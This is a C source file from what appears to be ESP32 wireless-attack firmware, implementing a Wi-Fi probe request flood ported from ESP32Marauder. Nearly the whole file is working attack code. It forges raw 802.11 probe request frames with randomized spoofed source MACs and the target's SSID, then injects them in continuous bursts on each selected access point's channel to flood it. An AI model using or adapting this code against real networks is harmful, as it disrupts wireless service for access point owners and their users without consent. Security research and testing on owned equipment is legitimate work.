/**
 * @file probe_request_flood.c
 * @brief Probe request flood attack implementation
 *
 * Floods probe requests carrying the SSID of the selected access point(s)
 * from randomized locally-administered source MACs. Ported from the
 * ESP32Marauder / esp32-div probe request flood attack.
 *
 * Note: This module interfaces with wifi_manager.c for shared state
 * and WiFi control functions.
 */

#include "attacks/wifi/probe_request_flood.h"
#include "managers/wifi_manager.h"
#include "managers/ap_manager.h"
#include "managers/status_display_manager.h"
#include "managers/ghostscript_runtime.h"
#include "core/system_manager.h"
#include "core/glog.h"
#include "esp_wifi.h"
#include "esp_random.h"
#include "freertos/task.h"
#include "freertos/portmacro.h"
#include <stdio.h>
#include <string.h>
#include <inttypes.h>

// External globals from wifi_manager.c
extern wifi_ap_record_t selected_ap;
extern wifi_ap_record_t *selected_aps;
extern int selected_ap_count;

// Module state
static volatile bool probe_flood_running = false;
static volatile uint32_t probe_flood_packets_sent = 0;
static TaskHandle_t probe_flood_task_handle = NULL;

// 26-byte 802.11 header + SSID IE (max 32) = 58 bytes max
#define PROBE_FLOOD_MAX_FRAME (26 + 32)

// Helper to sanitize SSID for logging
static void sanitize_ssid(const uint8_t* input_ssid, char* output_buffer, size_t buffer_size) {
    char temp_ssid[33];
    memcpy(temp_ssid, input_ssid, 32);
    temp_ssid[32] = '\0';
    if (strlen(temp_ssid) == 0) {
        snprintf(output_buffer, buffer_size, "[Hidden]");
    } else {
        snprintf(output_buffer, buffer_size, "%s", temp_ssid);
    }
}

// 802.11 probe request header template. Source MAC and sequence are
// randomized per frame; the SSID element is appended after the header.
static const uint8_t probe_req_header[26] = {
    0x40, 0x00,                         // Frame Control: Probe Request
    0x00, 0x00,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination addr (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source addr (randomized per frame)
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // BSSID (broadcast)
    0x00, 0x00,                         // Sequence number
};

// Build one probe request for an SSID, returns the frame length
static uint16_t build_probe_request(uint8_t *frame, const uint8_t *ssid, uint8_t ssid_len) {
    memcpy(frame, probe_req_header, sizeof(probe_req_header));

    // Randomized locally-administered source MAC per frame
    uint8_t src[6];
    esp_fill_random(src, 6);
    src[0] &= 0xFE;
    src[0] |= 0x02;
    memcpy(&frame[10], src, 6);

    uint16_t seq = (esp_random() & 0xFFF) << 4;
    frame[22] = seq & 0xFF;
    frame[23] = (seq >> 8) & 0xFF;

    // SSID element
    frame[24] = 0x00;
    frame[25] = ssid_len;
    if (ssid_len > 0) {
        memcpy(&frame[26], ssid, ssid_len);
    }
    return 26 + ssid_len;
}

static void probe_flood_task(void *param) {
    (void)param;
    // Static frame buffer: single task instance, no per-call stack cost
    static uint8_t frame[PROBE_FLOOD_MAX_FRAME];
    TickType_t last_log_tick = xTaskGetTickCount();
    uint32_t last_log_total = 0;

    while (probe_flood_running) {
        if (selected_ap_count > 0 && selected_aps != NULL) {
            // Flood probe requests for every selected AP on its own channel
            for (int i = 0; i < selected_ap_count; i++) {
                if (!probe_flood_running) break;
                uint8_t ssid_len = (uint8_t)strnlen((const char *)selected_aps[i].ssid, 32);
                esp_wifi_set_channel(selected_aps[i].primary, WIFI_SECOND_CHAN_NONE);
                uint16_t len = build_probe_request(frame, selected_aps[i].ssid, ssid_len);
                for (int burst = 0; burst < 10 && probe_flood_running; burst++) {
                    if (esp_wifi_80211_tx(ap_manager_get_tx_iface(), frame, len, false) == ESP_OK) {
                        probe_flood_packets_sent++;
                    }
                }
                vTaskDelay(pdMS_TO_TICKS(5));
            }
        } else if (strlen((const char *)selected_ap.ssid) > 0) {
            // Flood the single selected AP's SSID
            uint8_t ssid_len = (uint8_t)strnlen((const char *)selected_ap.ssid, 32);
            esp_wifi_set_channel(selected_ap.primary, WIFI_SECOND_CHAN_NONE);
            uint16_t len = build_probe_request(frame, selected_ap.ssid, ssid_len);
            for (int burst = 0; burst < 10 && probe_flood_running; burst++) {
                if (esp_wifi_80211_tx(ap_manager_get_tx_iface(), frame, len, false) == ESP_OK) {
                    probe_flood_packets_sent++;
                }
            }
            vTaskDelay(pdMS_TO_TICKS(10));
        } else {
            glog("no ap selected for probe request flood\n");
            probe_flood_running = false;
            break;
        }

        TickType_t now = xTaskGetTickCount();
        if ((now - last_log_tick) >= pdMS_TO_TICKS(5000)) {
            uint32_t total = probe_flood_packets_sent;
            uint32_t interval = total - last_log_total;
            last_log_total = total;
            last_log_tick = now;
            uint32_t pps = interval / 5;
            glog("Probe Flood: %lu/sec | Total: %lu\n", (unsigned long)pps, (unsigned long)total);
        }
    }
    probe_flood_task_handle = NULL;
    vTaskDeleteWithCaps(NULL);
}

void probe_request_flood_start(void) {
    if (probe_flood_running) {
        glog("Probe Request Flood already running\n");
        return;
    }

    // Validate target before starting
    if (selected_ap_count <= 0 && strlen((const char *)selected_ap.ssid) == 0) {
        glog("Probe Request Flood: No AP selected. Use 'select -a <index>' first.\n");
        return;
    }

    // Log target summary
    if (selected_ap_count > 0 && selected_aps != NULL) {
        glog("Starting probe request flood on %d selected APs:\n", selected_ap_count);
        for (int i = 0; i < selected_ap_count; i++) {
            char sanitized_ssid[33];
            sanitize_ssid(selected_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));
            glog("  [%d] %s (%02X:%02X:%02X:%02X:%02X:%02X) ch %d\n",
                 i, sanitized_ssid,
                 selected_aps[i].bssid[0], selected_aps[i].bssid[1], selected_aps[i].bssid[2],
                 selected_aps[i].bssid[3], selected_aps[i].bssid[4], selected_aps[i].bssid[5],
                 selected_aps[i].primary);
        }
    } else {
        char sanitized_ssid[33];
        sanitize_ssid(selected_ap.ssid, sanitized_ssid, sizeof(sanitized_ssid));
        glog("Starting probe request flood on: %s (ch %d)\n", sanitized_ssid, selected_ap.primary);
    }

    // Attack radio profile tears down the GhostNet AP (kicking any WebUI
    // client) and injects from the STA interface, keeping the radio free for
    // channel hopping.
    ap_manager_stop_services();
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(50));

    ESP_ERROR_CHECK(ap_manager_apply_attack_radio());

    probe_flood_running = true;
    probe_flood_packets_sent = 0;
#ifdef CONFIG_WITH_STATUS_DISPLAY
    status_display_show_attack("Probe Flood", "running");
#endif
    ghostscript_emit_event("attack_started", "probe_flood");
    BaseType_t attack_rc = xTaskCreate_psram(probe_flood_task, "probe_flood", 4096, NULL, 5, &probe_flood_task_handle);
    if (attack_rc != pdPASS) {
        glog("Probe Request Flood failed to start (attack=%ld)\n", (long)attack_rc);
        probe_flood_running = false;
        if (probe_flood_task_handle) {
            vTaskDeleteWithCaps(probe_flood_task_handle);
            probe_flood_task_handle = NULL;
        }
        esp_wifi_stop();
        (void)ap_manager_restore_after_attack("probe flood start");
#ifdef CONFIG_WITH_STATUS_DISPLAY
        status_display_show_status("Probe Flood failed");
#endif
        return;
    }
    glog("Probe Flood running. Use 'stopdeauth' or 'stop' to end.\n");
}

void probe_request_flood_stop(void) {
    if (!probe_flood_running && probe_flood_task_handle == NULL) {
        return;
    }

    probe_flood_running = false;

    // Wait for the task to finish gracefully before force deletion
    int wait_count = 0;
    while (probe_flood_task_handle != NULL && wait_count < 100) {
        vTaskDelay(pdMS_TO_TICKS(10));
        wait_count++;
    }

    if (probe_flood_task_handle) {
        TaskHandle_t temp_handle = probe_flood_task_handle;
        probe_flood_task_handle = NULL;
        vTaskDeleteWithCaps(temp_handle);
    }

    esp_wifi_stop();
    (void)ap_manager_restore_after_attack("probe flood stop");

    glog("Probe Flood stopped. Total: %lu packets\n", (unsigned long)probe_flood_packets_sent);
#ifdef CONFIG_WITH_STATUS_DISPLAY
    status_display_show_status("Probe Flood stopped");
#endif
    ghostscript_emit_event("attack_stopped", "probe_flood");
}

bool probe_request_flood_is_running(void) {
    return probe_flood_running;
}
